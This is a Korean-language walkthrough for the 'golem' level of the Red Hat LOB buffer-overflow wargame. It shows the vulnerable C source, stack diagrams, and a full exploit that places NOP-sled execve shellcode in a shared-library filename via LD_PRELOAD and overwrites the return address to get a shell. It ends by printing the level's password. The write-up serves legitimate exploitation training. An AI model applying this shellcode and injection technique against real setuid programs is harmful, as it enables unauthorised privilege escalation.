============================================================================================================
[redhat-lob] (11) golem
============================================================================================================


공유 라이브러리 주소 : nop(40 byte) + shellcode (39 byte) 

argv[1] : nop(44 byte) + 공유 라이브러리 주소


.. graphviz::

    digraph foo {
        a -> b -> c -> d -> e;

        a [shape=box, label="dummy * 44 + shared libc address"];
        b [shape=box, color=lightblue, label="strcpy"];
        c [shape=box, label="Buffer Overflow"];
        d [shape=box, label="shared libc address"];
        e [shape=box, label="dummy * 40 + shellcode"];
    }

|

source code
============================================================================================================

.. code-block:: c

    #include <stdio.h>
    #include <stdlib.h>

    extern char **environ;

    main(int argc, char *argv[])
    {
        char buffer[40];
        int i;

        if(argc < 2){
            printf("argv error\n");
            exit(0);
        }

        if(argv[1][47] != '\xbf')
        {
            printf("stack is still your friend.\n");
            exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // stack destroyer!
        memset(buffer, 0, 44);
        memset(buffer+48, 0, 0xbfffffff - (int)(buffer+48));
    }

|

Vulnerabliity Vector
============================================================================================================

main 함수의 ret를 덮어씌워 오버플로우를 발생시킨다.

.. code-block:: console

    ==============================
    LOW     
    ------------------------------
    local variables of main
    saved registers of main
    return address of main <<- overflow
    argc
    argv
    envp
    stack from startup code
    argc
    argv pointers
    NULL that ends argv[]
    environment pointers
    NULL that ends envp[]
    ELF Auxiliary Table
    argv strings
    environment strings
    program name
    NULL
    ------------------------------
    HIGH (0xC0000000)    
    ==============================

|

Segmentation fault
============================================================================================================

Overflow condition 

- argv[1] value의 47번째 문자가 "\\xbf"이어야 함
- 사용한 메모리 전체 초기화로 인해, 프로그램에서 사용한 메모리 주소로 버퍼오버플로우를 진행할 수 없다


.. code-block:: console

    ※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행
    $ bash2
    $ ./golem `python -c 'print "a"*47'`

    stack is still your friend.
    
    $ ./golem `python -c 'print "a"*47+"\xbf"'`

    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒
    Segmentation fault

|

exploit
============================================================================================================

쉘코드 파일명을 공유 라이브러리로 등록
--------------------------------------------------------------------------------------------------------------

기존에 사용한 쉘코드에는 "\\x2f" 값이 있기 때문에 정상적으로 쉘코드가 동작하지 않습니다.

"\\x2f"가 없는 쉘코드로 파일명을 생성하도록 합니다.

공유 라이브러리 영역에 쉘코드로 파일명을 등록합니다.

.. code-block:: console
    
    $ gcc -fPIC -shared -o `python -c 'print "\x90"*40 + "\x31\xc0\x50\xba\x11\x11\x11\x11\x81\xc2\x1e\x1e\x62\x57\x52\xba\x11\x11\x11\x11\x81\xc2\x1e\x51\x58\x5d\x52\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'` golem.c

    $ export LD_PRELOAD=./`python -c 'print "\x90"*40 + "\x31\xc0\x50\xba\x11\x11\x11\x11\x81\xc2\x1e\x1e\x62\x57\x52\xba\x11\x11\x11\x11\x81\xc2\x1e\x51\x58\x5d\x52\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`

gdb를 통해 공유 라이브러리에 올라간 쉘코드 주소를 확인합니다.

.. code-block:: console

    (gdb) b* main
    Breakpoint 1 at 0x8048500

    (gdb) r
    Starting program: /home/skeleton/golem2
    /bin/bash: /home/troll/.bashrc: Permission denied

    Breakpoint 1, 0x8048470 in main ()
    (gdb) x/100x $esp-3000

    ==========================================================================
    0xbfffeef4:     0x000005f0      0x0000004d      0x0000028d      0x00000319
    0xbfffef04:     0x000005a7      0x00000514      0x0000020c      0x00000659
    0xbfffef14:     0x000002a4      0x0000003f      0x00000311      0x000001fe
    0xbfffef24:     0x00000000      0x0000050f      0x00000446      0x00000000
    0xbfffef34:     0x00000500      0x0000054e      0x000006d6      0x0000068b
    0xbfffef44:     0x00000000      0x0000037d      0x00000000      0x0000038c
    0xbfffef54:     0x00000000      0x000000cb      0x0000059b      0x00000707
    0xbfffef64:     0x00000557      0x00000000      0x00000564      0x00000000
    0xbfffef74:     0x00000301      0x0000048e      0x00000550      0x00000000
    0xbfffef84:     0x0000067f      0x00000000      0x00000000      0x00000715
    0xbfffef94:     0x000005e9      0x0000060d      0x00000529      0x000003a4

    (중략)
    0xbffff604:     0xbffff64c      0x00000002      0x40023fd0      0x40013c00
    0xbffff614:     0x4000ba15      0x40013868      0x40000814      0x400041b0
    0xbffff624:     0x00000001      0xbffff634      0x40001528      0x000002c8
    0xbffff634:     0x00000000      0x080482d0      0x00000000      0x00000001
    0xbffff644:     0x40000824      0xbffff654      0x400075bb      0x40017000
    0xbffff654:     0x00002fb2      0x40013868      0xbffff7e4      0x4000380e
    0xbffff664:     0x40014428      0x90902f2e      0x90909090      0x90909090
                                        ^
    0xbffff674:     0x90909090      0x90909090      0x90909090      0x90909090
    0xbffff684:     0x90909090      0x90909090      0x90909090      0xc0319090
                                                                        ^
    0xbffff694:     0x1111ba50      0xc2811111      0x57621e1e      0x1111ba52
    0xbffff6a4:     0xc2811111      0x5d58511e      0x50e38952      0x31e18953
    ==========================================================================

|

shared libc 주소 쉘코드 실행
------------------------------------------------------------------------------------------------------------

.. code-block:: console

    shared libc ->> shellcode
    ==============================
    LOW     
    ------------------------------
    local variables of main
    saved registers of main
    return address of main <<- overflow
    argc
    argv
    envp
    stack from startup code
    argc
    argv pointers
    NULL that ends argv[]
    environment pointers
    NULL that ends envp[]
    ELF Auxiliary Table
    argv strings
    environment strings
    program name
    NULL
    ------------------------------
    HIGH (0xC0000000)
    ==============================

|


.. code-block:: console

    $ ./golem `python -c 'print "\x90"*44+"\x82\xf6\xff\xbf"'`
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    bash$ whoami

    golem
    bash$ my-pass
    euid = 511
    cup of coffee

